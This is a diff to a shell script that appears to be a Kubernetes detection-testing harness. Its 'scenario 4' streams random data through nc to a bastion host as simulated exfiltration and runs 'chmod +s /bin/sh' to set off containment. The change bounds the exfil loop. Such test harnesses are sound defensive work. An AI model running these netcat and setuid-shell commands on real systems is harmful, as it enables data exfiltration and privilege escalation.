@@ -179,9 +179,9 @@ run_scenario4() {
   say "[SC4] T0 (attack start) = $t0"
 
   # Launch background exfil stream throttled to ~200KB/s and trigger containment via chmod +s
-  # BusyBox-safe syntax for alpine / distroless shells
+  # BusyBox-safe syntax for alpine / distroless shells (bounded loop to avoid orphaned jobs)
   kubectl exec -n "$NS" "$target_pod" -- sh -c "
-    ( while true; do dd if=/dev/urandom bs=1024 count=20 2>/dev/null; sleep 0.1; done ) | nc $BASTION_IP $EXFIL_PORT &
+    ( for _ in \$(seq 1 300); do dd if=/dev/urandom bs=1024 count=20 2>/dev/null || break; sleep 0.1; done ) | nc $BASTION_IP $EXFIL_PORT &
     EXFIL_PID=\$!
     sleep 0.2
     chmod +s /bin/sh
